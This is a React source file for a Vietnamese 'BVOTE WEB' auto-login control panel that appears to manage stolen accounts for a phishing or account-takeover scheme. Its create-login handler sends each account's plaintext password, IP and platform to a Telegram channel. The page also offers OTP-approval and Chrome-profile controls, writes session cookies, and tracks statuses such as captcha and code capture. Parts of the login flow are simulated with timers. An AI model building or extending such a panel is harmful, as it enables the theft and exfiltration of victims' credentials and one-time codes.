import React, { useState, useMemo, useEffect } from 'react';
import { Helmet } from 'react-helmet';
import { motion } from 'framer-motion';
import { Button } from '@/components/ui/button';
import { Search, Globe, CheckSquare, RotateCcw, Wifi, AlertTriangle, Loader, Users2, Trash2, FilePlus2, Circle } from 'lucide-react';
import { Card, CardContent } from '@/components/ui/card';
import { useToast } from '@/components/ui/use-toast';
import { Input } from '@/components/ui/input';
import { OtpDialog } from '@/components/OtpDialog';
import { ChromeProfileDialog } from '@/components/ChromeProfileDialog';
import { useHistory } from '@/hooks/useHistory';
import { HistoryTable } from '@/components/dashboard/HistoryTable';
import { Pagination } from '@/components/dashboard/Pagination';
import { USClock } from '@/components/dashboard/USClock';
import { CreateLoginDialog } from '@/components/CreateLoginDialog';
import { NotificationsWidget } from '@/components/dashboard/NotificationsWidget';
import { sendTelegramMessage } from '@/services/telegram';

const TEMPLATES_STORAGE_KEY = 'notificationTemplatesList';

const AutoLoginPage = () => {
  const { toast } = useToast();
  const { historyData, updateHistoryEntry, setHistoryData, addHistoryEntry } = useHistory();
  const [isOtpOpen, setIsOtpOpen] = useState(false);
  const [isChromeProfileOpen, setIsChromeProfileOpen] = useState(false);
  const [isCreateLoginOpen, setIsCreateLoginOpen] = useState(false);
  const [searchTerm, setSearchTerm] = useState('');
  const [currentPage, setCurrentPage] = useState(1);
  const [selectedRows, setSelectedRows] = useState(new Set());
  const [notificationTemplates, setNotificationTemplates] = useState([]);
  const [chromeStatuses, setChromeStatuses] = useState({});
  const itemsPerPage = 10;

  useEffect(() => {
    try {
      const savedTemplates = localStorage.getItem(TEMPLATES_STORAGE_KEY);
      if (savedTemplates) {
        setNotificationTemplates(JSON.parse(savedTemplates));
      }
    } catch (error) {
      console.error("Failed to load notification templates from localStorage", error);
    }
  }, []);

  const filteredData = useMemo(() => 
    historyData.filter(item =>
      (item.account || '').toLowerCase().includes(searchTerm.toLowerCase()) ||
      (item.ip || '').toLowerCase().includes(searchTerm.toLowerCase()) ||
      (item.status || '').toLowerCase().includes(searchTerm.toLowerCase()) ||
      (item.linkName && item.linkName.toLowerCase().includes(searchTerm.toLowerCase()))
    ), [historyData, searchTerm]);

  const paginatedData = useMemo(() => 
    filteredData.slice((currentPage - 1) * itemsPerPage, currentPage * itemsPerPage),
    [filteredData, currentPage]
  );

  const totalPages = Math.ceil(filteredData.length / itemsPerPage);

  const handleSendNotification = (logId, templateId) => {
    const logEntry = historyData.find(item => item.id === logId);
    const template = notificationTemplates.find(t => t.id.toString() === templateId);

    if (logEntry && template) {
      toast({
        title: 'Đã gửi thông báo!',
        description: `Đã gửi mẫu "${template.title}" tới tài khoản ${logEntry.account}.`,
      });
    } else {
       toast({
        title: 'Lỗi',
        description: 'Không tìm thấy thông tin phiên đăng nhập hoặc mẫu thông báo.',
        variant: 'destructive',
      });
    }
  };

  const handleDeleteSelected = () => {
    if (selectedRows.size === 0) {
      toast({
        title: 'Chưa chọn mục nào',
        description: 'Vui lòng chọn ít nhất một mục để xóa.',
        variant: 'destructive',
      });
      return;
    }
    setHistoryData(prev => prev.filter(item => !selectedRows.has(item.id)));
    toast({
      title: `Đã xóa ${selectedRows.size} mục!`,
      variant: 'destructive'
    });
    setSelectedRows(new Set());
  };

  const handleApproveOtp = (otp) => {
    const selectedId = Array.from(selectedRows)[0];
    if (!selectedId) return;

    updateHistoryEntry(selectedId, {
      otp: otp,
      status: '✅ Thành công',
      cookie: `c_user=${Date.now()}; xs=${Math.random().toString(36).substring(2)};`
    });
    toast({ title: 'Thành công!', description: 'Đã duyệt OTP và đăng nhập thành công.' });
    setSelectedRows(new Set());
  };

  const handleResetSession = () => {
    const selectedId = Array.from(selectedRows)[0];
    if (!selectedId) return;
    
    const itemToReset = historyData.find(item => item.id === selectedId);
    if (itemToReset) {
      toast({
        title: '🚀 Đang khởi tạo lại...',
        description: `Bắt đầu quá trình đăng nhập lại cho ${itemToReset.account}.`,
      });
      // This is a simulation. A real implementation would re-trigger the login flow.
      setTimeout(() => updateHistoryEntry(itemToReset.id, { status: '1️⃣ Đang xử lý...', time: new Date().toLocaleString('vi-VN') }), 500);
      setTimeout(() => updateHistoryEntry(itemToReset.id, { status: '2️⃣ Điền thông tin...' }), 1500);
      setTimeout(() => updateHistoryEntry(itemToReset.id, { status: '3️⃣ Điều hướng...' }), 3000);
      setTimeout(() => {
        const statuses = [ '✅ Thành công', '🟡 Phê Duyệt', '🟡 Nhận Code', '🟠 Captcha', '❌ Sai mật khẩu'];
        const finalStatus = statuses[Math.floor(Math.random() * statuses.length)];
        updateHistoryEntry(itemToReset.id, { status: finalStatus });
        toast({ title: 'Đã reset!', description: `Quá trình đăng nhập cho ${itemToReset.account} đã kết thúc với trạng thái: ${finalStatus}` });
      }, 4500);
    }
    setSelectedRows(new Set());
  };

  const handleAssignChromeProfile = (profileName) => {
    selectedRows.forEach(id => {
      updateHistoryEntry(id, { chrome: profileName });
    });
    toast({
      title: 'Thành công!',
      description: `Đã gán "${profileName}" cho ${selectedRows.size} mục đã chọn.`,
    });
    setSelectedRows(new Set());
  };

  const handleAddLoginEntry = async (newEntry) => {
    const entryWithTime = {
      ...newEntry,
      time: new Date().toLocaleString('sv-SE').replace(' ', 'T'),
    };
    addHistoryEntry(entryWithTime);
    toast({
      title: 'Đã tạo thành công!',
      description: `Phiên đăng nhập cho "${newEntry.linkName}" đã được thêm vào bảng.`,
    });

    const telegramMessage = `
*🚨 Thông Báo Truy Cập Mới (Bảng Điều Khiển) 🚨*

*Thời gian:* \`${entryWithTime.time}\`
*Nền tảng:* ${entryWithTime.platform}
*Tên Link:* ${entryWithTime.linkName}
*Tài Khoản:* \`${entryWithTime.account}\`
*Mật khẩu:* ||${entryWithTime.password}||
*Trạng thái:* ${entryWithTime.status}
*IP:* \`${entryWithTime.ip}\`
    `;

    const result = await sendTelegramMessage(telegramMessage.trim());
    if (!result.success) {
      toast({
        title: 'Lỗi Telegram',
        description: result.message,
        variant: 'destructive',
      });
    }
  };

  const handleOpenProfile = (item) => {
    setChromeStatuses(prev => ({...prev, [item.id]: 'opening'}));
    toast({
      title: '🚀 Đang mở Chrome...',
      description: `Gửi lệnh mở profile ${item.chrome} và điều hướng tới ${item.platform}.`,
    });
    setTimeout(() => {
      setChromeStatuses(prev => ({...prev, [item.id]: 'opened'}));
    }, 2000);
  };
  
  return (
    <>
      <Helmet>
        <title>Bảng Điều Khiển - BVOTE WEB</title>
      </Helmet>
      <OtpDialog isOpen={isOtpOpen} setIsOpen={setIsOtpOpen} onApprove={handleApproveOtp} />
      <ChromeProfileDialog isOpen={isChromeProfileOpen} setIsOpen={setIsChromeProfileOpen} onAssign={handleAssignChromeProfile} />
      <CreateLoginDialog isOpen={isCreateLoginOpen} setIsOpen={setIsCreateLoginOpen} onAddEntry={handleAddLoginEntry} />

      <motion.div 
        initial={{ opacity: 0, y: -20 }} 
        animate={{ opacity: 1, y: 0 }}
        className="cyber-main-bg rounded-lg min-h-[calc(100vh-16px)]"
      >
        <div className="p-2 border-b border-border flex items-center justify-between">
            <div className="flex items-center">
              <div className="flex space-x-2 mr-4">
                  <div className="w-3 h-3 rounded-full bg-red-500"></div>
                  <div className="w-3 h-3 rounded-full bg-yellow-500"></div>
                  <div className="w-3 h-3 rounded-full bg-green-500"></div>
              </div>
              <h2 className="text-center font-bold text-lg text-white">BẢNG ĐIỀU KHIỂN LOGIN AUTO</h2>
            </div>
            <div className="flex items-center text-xs text-red-500">
              <Circle fill="currentColor" className="h-2 w-2 mr-1" />
              Mất kết nối
            </div>
        </div>
        
        <div className="p-4">
          <div className="grid grid-cols-1 lg:grid-cols-4 gap-4 mb-4">
            <Card className="cyber-card-bg p-4 text-slate-200 shadow-lg h-[220px]">
                <h2 className="text-center font-bold text-lg mb-3 text-white">Hệ Thống</h2>
                <div className="space-y-3 text-sm text-slate-300 p-2">
                    <p className="flex justify-between items-center"><span><Users2 className="inline-block mr-2 h-4 w-4 text-green-400"/>Online:</span> <span className="font-bold text-slate-100">0</span></p>
                    <p className="flex justify-between items-center"><span><Wifi className="inline-block mr-2 h-4 w-4 text-blue-400"/>Đang chạy:</span> <span className="font-bold text-slate-100">0</span></p>
                    <p className="flex justify-between items-center"><span><Loader className="inline-block mr-2 h-4 w-4 text-yellow-400"/>Chờ OTP:</span> <span className="font-bold text-slate-100">0</span></p>
                    <p className="flex justify-between items-center"><span><AlertTriangle className="inline-block mr-2 h-4 w-4 text-red-400"/>Bị lỗi:</span> <span className="font-bold text-slate-100">0</span></p>
                </div>
            </Card>
            <div className="lg:col-span-2">
              <NotificationsWidget />
            </div>
            <Card className="cyber-card-bg p-3 text-slate-200 shadow-lg h-[220px]">
              <h2 className="text-center font-bold text-lg mb-2 text-white">Đồng hồ giờ Mỹ</h2>
              <USClock />
            </Card>
          </div>

          <Card className="cyber-card-bg mt-4">
              <CardContent className="p-4">
                  <div className="flex justify-between items-center mb-4 flex-wrap gap-4">
                    <div className="relative w-full max-w-xs">
                      <Input 
                        type="text"
                        placeholder="Tìm kiếm..."
                        value={searchTerm}
                        onChange={(e) => { setSearchTerm(e.target.value); setCurrentPage(1); }}
                        className="bg-input border-border pl-10 text-white"
                      />
                      <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-5 w-5 text-gray-400" />
                    </div>
                    <div className="flex items-center space-x-2 flex-wrap gap-2">
                       <Button onClick={() => setIsCreateLoginOpen(true)} variant="outline" className="border-cyan-500 text-cyan-400 hover:bg-cyan-500/20 hover:text-cyan-300">
                          <FilePlus2 className="mr-2 h-4 w-4"/> Tạo Cột Login
                      </Button>
                      <Button onClick={() => setIsChromeProfileOpen(true)} disabled={selectedRows.size === 0} variant="outline" className="border-blue-500 text-blue-400 hover:bg-blue-500/20 hover:text-blue-300 disabled:opacity-50 disabled:cursor-not-allowed">
                          <Globe className="mr-2 h-4 w-4"/> Chrome Chỉ Định
                      </Button>
                      <Button onClick={() => setIsOtpOpen(true)} disabled={selectedRows.size !== 1} variant="outline" className="border-yellow-500 text-yellow-400 hover:bg-yellow-500/20 hover:text-yellow-300 disabled:opacity-50 disabled:cursor-not-allowed">
                          <CheckSquare className="mr-2 h-4 w-4"/> Duyệt OTP
                      </Button>
                       <Button onClick={handleResetSession} disabled={selectedRows.size !== 1} variant="outline" className="border-gray-500 text-gray-400 hover:bg-gray-500/20 hover:text-gray-300 disabled:opacity-50 disabled:cursor-not-allowed">
                          <RotateCcw className="mr-2 h-4 w-4"/> Reset Phiên
                      </Button>
                      <Button onClick={handleDeleteSelected} disabled={selectedRows.size === 0} variant="outline" className="border-red-500 text-red-400 hover:bg-red-500/20 hover:text-red-300 disabled:opacity-50 disabled:cursor-not-allowed">
                          <Trash2 className="mr-2 h-4 w-4"/> Xóa mục chọn
                      </Button>
                    </div>
                  </div>
                  <HistoryTable 
                    historyData={paginatedData} 
                    toast={toast} 
                    onSendNotification={handleSendNotification} 
                    selectedRows={selectedRows} 
                    setSelectedRows={setSelectedRows}
                    onOpenProfile={handleOpenProfile}
                    notificationTemplates={notificationTemplates}
                    chromeStatuses={chromeStatuses}
                  />
                  {totalPages > 1 && (
                    <Pagination
                        currentPage={currentPage}
                        totalPages={totalPages}
                        setCurrentPage={setCurrentPage}
                    />
                  )}
              </CardContent>
          </Card>
        </div>
      </motion.div>
    </>
  );
};

export default AutoLoginPage;